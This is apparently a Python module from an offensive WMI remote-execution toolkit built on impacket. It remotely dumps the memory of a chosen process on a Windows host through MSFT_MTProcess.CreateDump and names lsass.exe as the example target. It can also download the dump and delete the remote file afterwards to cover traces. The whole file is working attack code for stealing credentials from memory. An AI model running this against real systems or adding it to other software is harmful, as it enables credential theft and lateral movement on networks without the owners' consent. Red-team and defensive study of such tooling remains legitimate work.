# Process dump via MSFT_MTProcess.CreateDump()
# Namespace: root/Microsoft/Windows/ManagementTools
# Requirements: Windows Server 2016+ / Windows 10+
# Reference: https://learn.microsoft.com/en-us/windows/win32/wmisdk/msft-mtprocess-createdump
# Reference: https://github.com/0xthirteen/WMI_Proc_Dump

import logging
import ntpath

from lib.modules.filetransfer import filetransfer_Toolkit
from lib.module_base import ModuleBase
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.dcerpc.v5.dcom.wmi import DCERPCSessionError


class ProcessDump_Toolkit(ModuleBase):
    name = "processdump"
    description = "Dump process memory via MSFT_MTProcess.CreateDump() (Server 2016+)."

    @staticmethod
    def register_parser(subparsers):
        p = subparsers.add_parser(ProcessDump_Toolkit.name, help=ProcessDump_Toolkit.description)
        p.add_argument("-action", action="store", choices=["list", "dump"], required=True,
                       help="Action: list (list processes), dump (dump process memory).")
        p.add_argument("-pid", action="store", type=int, help="Target process ID for dump.")
        p.add_argument("-proc", action="store", help="Target process name for dump (e.g. lsass.exe).")
        p.add_argument("-name", action="store", help="Filter process list by name.")
        p.add_argument("-dl", action="store_true", help="Download dump file via PS_ModuleFile after dump.")
        p.add_argument("-cleanup", action="store_true", help="Delete remote dump file after download.")
        return p

    @staticmethod
    def run(iWbemLevel1Login, dcom, options, **kwargs):
        toolkit = ProcessDump_Toolkit(iWbemLevel1Login, dcom)
        if options.action == "list":
            toolkit.list_processes(name_filter=options.name)
        elif options.action == "dump":
            target = options.pid or options.proc
            if target:
                toolkit.dump_process(target, download=options.dl, cleanup=options.cleanup)
            else:
                logging.getLogger("wmiexec-pro").error("Specify -pid or -proc for dump.")

    def __init__(self, iWbemLevel1Login, dcom):
        self.iWbemLevel1Login = iWbemLevel1Login
        self.dcom = dcom
        self.logger = logging.getLogger("wmiexec-pro")
        self.NAMESPACE = "//./root/Microsoft/Windows/ManagementTools"

    def _get_wmi_service(self):
        iWbemServices = self.iWbemLevel1Login.NTLMLogin(self.NAMESPACE, NULL, NULL)
        iWbemServices.get_dce_rpc().set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        self.iWbemLevel1Login.RemRelease()
        return iWbemServices

    def list_processes(self, name_filter=None):
        """List processes via MSFT_MTProcess."""
        iWbemServices = self._get_wmi_service()
        if name_filter:
            wql = f"SELECT ProcessId, Name, UserName FROM MSFT_MTProcess WHERE Name LIKE '%{name_filter}%'"
        else:
            wql = "SELECT ProcessId, Name, UserName FROM MSFT_MTProcess"

        iEnumWbemClassObject = iWbemServices.ExecQuery(wql)
        self.logger.log(100, f"{'PID':<10} {'User':<30} {'Name'}")
        self.logger.log(100, f"{'---':<10} {'---':<30} {'---'}")
        while True:
            try:
                obj = iEnumWbemClassObject.Next(0xffffffff, 1)[0]
                record = dict(obj.getProperties())
                pid = str(record["ProcessId"]["value"])
                name = record["Name"]["value"] or ""
                user = record["UserName"]["value"] or ""
                self.logger.log(100, f"{pid:<10} {user:<30} {name}")
            except Exception as e:
                if "S_FALSE" in str(e):
                    break
                else:
                    pass
        iEnumWbemClassObject.RemRelease()

    def dump_process(self, pid, download=False, cleanup=False):
        """Dump process memory via MSFT_MTProcess.CreateDump()."""
        iWbemServices = self._get_wmi_service()

        # Support process name lookup
        if not str(pid).isdigit():
            self.logger.info(f"Looking up PID for process: {pid}")
            iEnumWbemClassObject = iWbemServices.ExecQuery(f"SELECT ProcessId FROM MSFT_MTProcess WHERE Name = '{pid}'")
            try:
                obj = iEnumWbemClassObject.Next(0xffffffff, 1)[0]
                pid = obj.getProperties()["ProcessId"]["value"]
                self.logger.info(f"Found PID: {pid}")
            except Exception:
                self.logger.error(f"Process '{pid}' not found!")
                return

        # ExecMethod approach (from 0xthirteen reference)
        object_path = f"MSFT_MTProcess.ProcessId={pid}"
        try:
            self.logger.info(f"Calling CreateDump on PID {pid}...")
            result = iWbemServices.ExecMethod(object_path, "CreateDump", {})
        except DCERPCSessionError as e:
            if e.error_code == 0x80041002:  # WBEM_E_NOT_FOUND
                self.logger.error(f"Process with PID {pid} not found!")
            else:
                self.logger.error(f"CreateDump failed: {e!s}")
            return
        except Exception as e:
            self.logger.error(f"CreateDump failed: {e!s}")
            return

        properties = result.getProperties()
        dump_path = None
        for prop, value in properties.items():
            if prop.lower() == "dumpfilepath":
                dump_path = value["value"]

        if dump_path:
            self.logger.log(100, f"Process dumped: {dump_path}")

            if download:
                _, filename = ntpath.split(dump_path)
                local_path = filename
                self.logger.info(f"Downloading dump file to {local_path}...")
                transfer = filetransfer_Toolkit(self.iWbemLevel1Login, self.dcom)
                transfer.downloadFile_Native(target_File=dump_path, save_Location=local_path)

            if cleanup:
                self.logger.info(f"Cleaning up remote dump file...")
                transfer = filetransfer_Toolkit(self.iWbemLevel1Login, self.dcom)
                transfer.deleteFile(target_File=dump_path)
        else:
            self.logger.error("CreateDump returned no dump file path.")
